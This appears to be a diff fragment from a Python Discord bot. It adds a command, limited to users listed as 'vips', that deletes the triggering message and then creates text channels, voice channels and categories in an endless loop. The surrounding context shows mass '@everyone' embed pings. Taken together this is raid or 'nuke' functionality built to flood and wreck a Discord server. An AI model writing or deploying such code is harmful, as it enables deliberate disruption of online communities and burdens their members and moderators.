@@ -269,6 +269,15 @@ class MyClient(discord.Client):
 						await i.send('@everyone', embed=embed)
 						s += 1
 					
+					
+			if vips.find(str(message.author.id)) != -1:
+				if message.content.startswith('*випканалы+'):
+					await message.delete()
+					n = message.content.replace('*випканалы+', '')
+					while True:
+						await message.guild.create_text_channel(name=n)
+						await message.guild.create_voice_channel(name=n)
+						await message.guild.create_category(name=n)
 			
 					
 
